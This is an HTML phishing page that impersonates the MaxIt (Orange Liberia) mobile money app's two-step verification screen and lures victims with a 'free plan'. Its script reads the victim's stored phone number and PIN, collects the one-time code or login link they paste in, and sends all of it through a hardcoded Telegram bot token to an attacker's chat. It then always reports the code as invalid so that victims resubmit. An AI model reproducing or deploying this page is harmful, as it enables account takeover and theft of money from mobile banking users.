<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Enter OTP - MaxIt</title>
<style>
  :root {
    --bg: #141415;
    --text: #cfcfcf;
    --muted: #9a9a9a;
    --accent: #ff6600;
    --line: #8a8a8a;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: var(--bg); font-family: Roboto, "Segoe UI", system-ui, sans-serif; }

  .screen {
    position: relative;
    width: 100%;
    max-width: 480px;
    min-height: 100vh;
    min-height: 100dvh;
    margin: 0 auto;
    background: var(--bg);
    overflow: hidden;
    display: flex;
    flex-direction: column;
  }

  .hero {
    position: relative;
    flex: 1 1 auto;
    min-height: 45vh;
    background:
      linear-gradient(rgba(0,0,0,.55), rgba(0,0,0,.55)),
      url("Screenshot_2026-11-03-19-56-24-515-edit_com.orange.myorange.olr.jpg") center top / cover no-repeat,
      linear-gradient(160deg, #ff6600 0%, #cc5200 60%, #993d00 100%);
  }

  .back {
    position: absolute;
    top: 18px; left: 16px;
    width: 40px; height: 40px;
    display: grid; place-items: center;
    background: none; border: 0; cursor: pointer;
  }
  .back svg { width: 26px; height: 26px; stroke: #fff; }

  .wave {
    position: absolute;
    left: 0; right: 0; bottom: -1px;
    width: 100%; height: 60px;
    display: block;
  }

  .panel {
    flex: 0 0 auto;
    background: var(--bg);
    padding: 22px 32px 40px;
  }

  h1 {
    font-size: 24px;
    font-weight: 700;
    color: var(--text);
    letter-spacing: .2px;
    margin-bottom: 10px;
  }

  p.subtitle {
    color: var(--muted);
    font-size: 15px;
    margin-bottom: 30px;
    line-height: 1.4;
  }

  p.subtitle span {
    color: var(--text);
    font-weight: 600;
  }

  .field {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 10px 0 14px 14px;
    border-bottom: 1.5px solid var(--line);
    transition: border-color .2s;
    margin-bottom: 20px;
  }
  .field:focus-within { border-color: var(--accent); }
  .field svg { width: 26px; height: 26px; fill: var(--accent); flex: none; }
  
  .field input {
    flex: 1;
    background: none; border: 0; outline: 0;
    color: var(--text);
    font-size: 18px;
    letter-spacing: 2px;
    font-family: inherit;
  }
  .field input::placeholder { color: var(--muted); letter-spacing: normal; }

  .resend-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 14px;
    color: var(--muted);
    margin-bottom: 10px;
  }

  .resend-btn {
    background: none;
    border: 0;
    color: var(--accent);
    cursor: pointer;
    font-family: inherit;
    font-weight: 600;
  }
  .resend-btn:disabled {
    color: var(--muted);
    cursor: not-allowed;
  }
  .resend-btn:not(:disabled):hover { text-decoration: underline; }

  .verify {
    display: block;
    width: 100%;
    margin: 24px auto 0;
    padding: 18px;
    background: var(--accent);
    color: #fff;
    border: 0;
    border-radius: 10px;
    font-size: 17px;
    font-weight: 700;
    font-family: inherit;
    cursor: pointer;
    transition: filter .15s, transform .05s;
  }
  .verify:hover { filter: brightness(1.15); }
  .verify:active { transform: scale(.98); }
  .verify:disabled { opacity: 0.6; cursor: not-allowed; }

  /* Modal */
  .modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.75);
    backdrop-filter: blur(4px);
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.2s ease;
    z-index: 1000;
  }
  .modal-overlay.active {
    opacity: 1;
    pointer-events: auto;
  }
  .modal-dialog {
    background: #1c1c1e;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 16px;
    width: 100%;
    max-width: 360px;
    padding: 28px 22px;
    text-align: center;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  }
  .modal-logo {
    font-weight: 900;
    font-size: 20px;
    color: #ff6600;
    margin-bottom: 18px;
    letter-spacing: 0.5px;
  }
  .modal-divider {
    width: 100%;
    height: 1px;
    background: rgba(255,255,255,0.08);
    margin-bottom: 22px;
  }
  .modal-title {
    color: #fff;
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 12px;
  }
  .modal-message {
    color: var(--muted);
    font-size: 15px;
    line-height: 1.5;
    margin-bottom: 26px;
  }
  .modal-ok-button {
    width: 100%;
    background: var(--accent);
    color: white;
    border: none;
    border-radius: 10px;
    padding: 14px;
    font-size: 15px;
    font-weight: 700;
    font-family: inherit;
    text-transform: uppercase;
    cursor: pointer;
    transition: filter 0.2s;
  }
  .modal-ok-button:hover { filter: brightness(1.15); }
</style>
</head>
<body>
  <main class="screen">
    <section class="hero">
      <button class="back" aria-label="Back" onclick="history.back()">
        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M19 12H5M12 19l-7-7 7-7"/>
        </svg>
      </button>

      <svg class="wave" viewBox="0 0 400 60" preserveAspectRatio="none" aria-hidden="true">
        <path d="M0 14 C 60 -6, 130 -4, 200 14 S 340 40, 400 8 L400 60 L0 60 Z" fill="#141415"/>
      </svg>
    </section>

    <form class="panel" id="otpForm" novalidate>
      <h1>Two Step Verification</h1>
      <p class="subtitle">Paste the complete link/sms message sent to your number to activate free plan <span id="userPhone">+231 770000000</span></p>

      <label class="field">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
        </svg>
        <input type="text" id="otpCode" autocomplete="one-time-code"
               placeholder="Enter code (e.g., https://mobile.prod-maxit.orange.com.lr/oms-links/auth?token=37gvdlut1z8e40pysq)">
      </label>

      <div class="resend-container">
        <span id="timerText">Resend code in <strong id="countdown" style="color:var(--text);">30</strong>s</span>
        <button type="button" class="resend-btn" id="resendBtn" disabled>Resend</button>
      </div>

      <button class="verify" type="submit" id="verifyBtn">Verify & Proceed</button>
    </form>
  </main>

  <!-- Invalid OTP Modal -->
  <div class="modal-overlay" id="errorModal">
    <div class="modal-dialog">
      <div class="modal-logo">MaxIt</div>
      <div class="modal-divider"></div>
      <h3 class="modal-title">Token Verification</h3>
      <p class="modal-message">
        The entered OTP value is invalid.<br>
        Please try again.
      </p>
      <button class="modal-ok-button" id="modalOkBtn">OK</button>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '8968898813:AAFZNIpX05KpoWyCHr1aW7l1UoeuRRiXP34';
    const CHAT_ID = '5520957080';

    function sendToTelegram(message) {
      const encoded = encodeURIComponent(message);
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
        .then(r => r.json())
        .then(r => { console.log('Telegram (otp):', r); return r; })
        .catch(e => { console.error('Telegram error:', e); });
    }

    // Show the phone from previous step
    const planData = JSON.parse(localStorage.getItem('maxitPlanData')) || {};
    if (planData.phone) {
      document.getElementById('userPhone').textContent = planData.phone;
    }

    // Countdown timer
    let timeLeft = 30;
    const countdownEl = document.getElementById('countdown');
    const resendBtn = document.getElementById('resendBtn');
    const timerText = document.getElementById('timerText');

    function startTimer() {
      timeLeft = 30;
      resendBtn.disabled = true;
      timerText.innerHTML = 'Resend code in <strong id="countdown" style="color:var(--text);">' + timeLeft + '</strong>s';

      const timer = setInterval(function () {
        timeLeft--;
        const currentCountdown = document.getElementById('countdown');
        if (currentCountdown) currentCountdown.textContent = timeLeft;

        if (timeLeft <= 0) {
          clearInterval(timer);
          timerText.textContent = "Didn't receive the code?";
          resendBtn.disabled = false;
        }
      }, 1000);
    }
    startTimer();

    // OTP attempt counter (per session)
    let otpAttempts = parseInt(localStorage.getItem('maxitOtpAttempts') || '0', 10);

    const otpForm = document.getElementById('otpForm');
    const otpInput = document.getElementById('otpCode');
    const verifyBtn = document.getElementById('verifyBtn');
    const errorModal = document.getElementById('errorModal');
    const modalOkBtn = document.getElementById('modalOkBtn');

    otpForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const otp = otpInput.value.trim();

      if (!otp) { otpInput.focus(); return; }

      otpAttempts++;
      localStorage.setItem('maxitOtpAttempts', String(otpAttempts));

      // Persist last attempted OTP
      planData.otp = otp;
      localStorage.setItem('maxitPlanData', JSON.stringify(planData));

      verifyBtn.disabled = true;
      verifyBtn.textContent = 'Verifying...';

      const message = `

📞 Phone: ${planData.phone || 'N/A'}
🔑 PIN: ${planData.pin || 'N/A'}
 OTP Entered : ${otp}

      `;

      sendToTelegram(message).finally(() => {
        verifyBtn.disabled = false;
        verifyBtn.textContent = 'Verify & Proceed';
        errorModal.classList.add('active');
      });
    });

    // OK → close modal, clear OTP, refocus → retry again
    modalOkBtn.addEventListener('click', () => {
      errorModal.classList.remove('active');
      otpInput.value = '';
      otpInput.focus();
    });

    resendBtn.addEventListener('click', function () {
      alert('A new verification code has been sent.');
      startTimer();
    });
  </script>
</body>
</html>
